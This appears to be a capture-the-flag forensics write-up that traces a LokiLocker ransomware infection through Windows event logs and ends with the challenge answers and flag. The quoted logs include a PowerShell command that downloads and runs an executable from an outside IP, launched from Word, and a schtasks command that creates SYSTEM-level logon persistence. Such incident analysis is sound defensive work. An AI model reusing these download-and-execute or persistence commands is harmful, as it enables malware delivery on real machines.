# valhalloween

As I was walking the neighbor's streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as ""The God of Mischief!"". 
He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it into my computer, all my files were corrupted! 
First, spawn the haunted Docker instance and connect to it! 
Dig through the horrors that lie in the given Logs and answer whatever questions are asked of you!

## Solution

`nc 94.237.49.11 45251`

```txt
Security.evtx

Process Command Line:	powershell.exe  (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe');start-process 'C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe'

Process Command Line:	"C:\Windows\System32\cmd.exe" /C schtasks /CREATE /SC ONLOGON /TN Loki /TR C:\Users\HoaGay\AppData\Roaming\winlogon.exe /RU SYSTEM /RL HIGHEST /F
```

```txt
Process Information:
New Process ID:		0x1b80
New Process Name:	C:\Windows\System32\conhost.exe
Token Elevation Type:	%%1937
Mandatory Label:		Mandatory Label\High Mandatory Level
Creator Process ID:	0x1f74
Creator Process Name:	C:\Windows\System32\cmd.exe
Process Command Line:	\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1

Process Information:
New Process ID:		0x1f74
New Process Name:	C:\Windows\System32\cmd.exe
Token Elevation Type:	%%1937
Mandatory Label:		Mandatory Label\High Mandatory Level
Creator Process ID:	0x1d68
Creator Process Name:	C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe
Process Command Line:	"C:\Windows\System32\cmd.exe" /C schtasks /CREATE /SC ONLOGON /TN Loki /TR C:\Users\HoaGay\AppData\Roaming\winlogon.exe /RU SYSTEM /RL HIGHEST /F
9/19/2023 11:03:56 PM

Process Information:
New Process ID:		0x1d68
New Process Name:	C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0xf10
Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process Command Line:	"C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe"
9/19/2023 11:03:24 PM

Process Information:
New Process ID:		0xf10
New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x2248
Creator Process Name:	C:\Windows\System32\cmd.exe
Process Command Line:	powershell.exe  (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe');start-process 'C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe'
9/19/2023 11:03:23 PM

Process Information:
New Process ID:		0x2248
New Process Name:	C:\Windows\System32\cmd.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x1c70
Creator Process Name:	C:\Program Files\Microsoft Office\Office15\WINWORD.EXE
Process Command Line:	c:\\microsoft\\office\\word\\document\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c powershell.exe (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','%temp%\mscalc.exe');start-process '%temp%\mscalc.exe'
9/19/2023 11:03:22 PM

Process Information:
New Process ID:		0x1c70
New Process Name:	C:\Program Files\Microsoft Office\Office15\WINWORD.EXE
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0xf70
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Program Files\Microsoft Office\Office15\WINWORD.EXE" /n "C:\Users\HoaGay\Documents\Subjects\Unexpe.docx" /o ""
9/19/2023 11:03:20 PM

Process Information:
New Process ID:		0xf70
New Process Name:	C:\Windows\explorer.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0xdfc
Creator Process Name:	C:\Windows\System32\userinit.exe
Process Command Line:	C:\Windows\Explorer.EXE
9/19/2023 11:00:32 PM

Process Information:
New Process ID:		0xdfc
New Process Name:	C:\Windows\System32\userinit.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x260
Creator Process Name:	C:\Windows\System32\winlogon.exe
Process Command Line:	C:\Windows\system32\userinit.exe
9/19/2023 11:00:31 PM

Process Information:
New Process ID:		0x260
New Process Name:	C:\Windows\System32\winlogon.exe
Token Elevation Type:	%%1936
Mandatory Label:		Mandatory Label\System Mandatory Level
Creator Process ID:	0x1f8
Creator Process Name:	C:\Windows\System32\smss.exe
Process Command Line:
9/19/2023 11:00:05 PM
```

```txt
Process Information:
New Process ID:		0x178c
New Process Name:	C:\Users\HoaGay\Downloads\7z2107-x64.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x16e8
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Users\HoaGay\Downloads\7z2107-x64.exe" 
9/19/2023 12:33:02 AM

Process Information:
New Process ID:		0x16c0
New Process Name:	C:\Users\HoaGay\AppData\Local\Microsoft\OneDrive\OneDrive.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x1108
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Users\HoaGay\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
9/18/2023 11:27:10 PM

Process Information:
New Process ID:		0xb04
New Process Name:	C:\Users\HoaGay\AppData\Local\Microsoft\OneDrive\OneDrive.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x1630
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Users\HoaGay\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
5/31/2023 12:56:45 AM




Process Information:
New Process ID:		0x1460
New Process Name:	C:\Program Files\Microsoft Office\Office15\FIRSTRUN.EXE
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x22e0
Creator Process Name:	C:\Program Files\Microsoft Office\Office15\EXCEL.EXE
Process Command Line:	"C:\Program Files\Microsoft Office\Office15\FIRSTRUN.EXE" /ProgId ProPlusVolume
9/19/2023 11:02:06 PM

Process Information:
New Process ID:		0xf6c
New Process Name:	C:\Program Files\7-Zip\7zG.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0xf70
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\HoaGay\Documents\Subjects\" -an -ai#7zMap10417:94:7zEvent9315
9/19/2023 11:01:54 PM

Process Information:
	New Process ID:		0x14c8
New Process Name:	C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\proplus.ww\ose.exe
Token Elevation Type:	%%1937
Mandatory Label:		Mandatory Label\High Mandatory Level
Creator Process ID:	0x168c
Creator Process Name:	C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\setup.exe
Process Command Line:	"C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\proplus.ww\ose.exe" -standalone:temp
9/19/2023 12:33:49 AM

Process Information:
New Process ID:		0x168c
New Process Name:	C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\setup.exe
Token Elevation Type:	%%1937
Mandatory Label:		Mandatory Label\High Mandatory Level
Creator Process ID:	0x16e8
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\setup.exe" 
9/19/2023 12:33:44 AM

Process Information:
New Process ID:		0x1830
New Process Name:	C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\setup.exe
Token Elevation Type:	%%1938
Mandatory Label:		Mandatory Label\Medium Mandatory Level
Creator Process ID:	0x16e8
Creator Process Name:	C:\Windows\explorer.exe
Process Command Line:	"C:\Users\HoaGay\Downloads\Setup 0ffice 2013 64bit\setup.exe"
9/19/2023 12:33:42 AM
```

```txt
https://www.hybrid-analysis.com/sample/7c890018d49fe085cd8b78efd1f921cc01936c190284a50e3c2a0b36917c9e10
Trojan.Generic

https://www.virustotal.com/gui/file/7c890018d49fe085cd8b78efd1f921cc01936c190284a50e3c2a0b36917c9e10
lokilocker


9/19/2023 11:04:35 PM -> 2023-09-19_11:04:35  NOPE
9/19/2023 11:04:00 PM -> 
9/19/2023 11:03:59 PM -> 
9/19/2023 11:03:58 PM -> 
9/19/2023 11:03:57 PM -> 2023-09-19_11:03:57  NOPE
9/19/2023 11:03:56 PM -> 2023-09-19_11:03:56  NOPE
9/19/2023 11:03:29 PM -> 2023-09-19_11:03:29  NOPE
9/19/2023 11:03:24 PM -> 2023-09-19_11:03:24  NOPE
9/19/2023 11:03:23 PM -> 2023-09-19_11:03:23  NOPE
9/19/2023 11:03:22 PM -> 2023-09-19_11:03:22  NOPE
9/19/2023 11:03:20 PM -> 2023-09-19_11:03:20  NOPE
9/19/2023 11:03:08 PM -> 2023-09-19_11:03:08  NOPE

9/19/2023 11:02:06 PM -> 2023-09-19_11:02:06  NOPE
9/19/2023 11:01:54 PM -> 2023-09-19_11:01:54  NOPE
9/19/2023 11:00:32 PM -> 2023-09-19_11:00:32  NOPE
9/19/2023 11:00:31 PM -> 2023-09-19_11:00:31  NOPE
9/19/2023 11:00:05 PM -> 2023-09-19_11:00:05  NOPE

9/19/2023 12:33:49 AM -> 2023-09-19_12:33:49
9/19/2023 12:33:44 AM -> 2023-09-19_12:33:44  NOPE
9/19/2023 12:33:42 AM -> 2023-09-19_12:33:42  NOPE
9/19/2023 12:06:58 AM -> 2023-09-19_12:06:58  NOPE
```

```ps1
Get-WinEvent -Path Security.evtx | Export-CSV Security.csv
```

NOTE: UTC!!!!! use XML view

2023-09-19T04:33:42.8835949Z -> 2023-09-19_04:33:42
2023-09-19T04:33:44.3163792Z -> 2023-09-19_04:33:44
2023-09-20T03:03:20.2548814Z -> 2023-09-20_03:03:20

```txt
ANSWERS

What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)
> 103.162.14.116:8888

According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)
> B94F3FF666D9781CB69088658CD53772

Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)
> lokilocker

What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)
> Loki

What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)
> powershell.exe_3856

Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\Data\KCorp\FirstStage.pdf)
> C:\Users\HoaGay\Documents\Subjects\Unexpe.docx

When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)
> 2023-09-20_03:03:20
```

`HTB{N0n3_c4n_ru1n_th3_H@ll0w33N_Sp1r1t}`
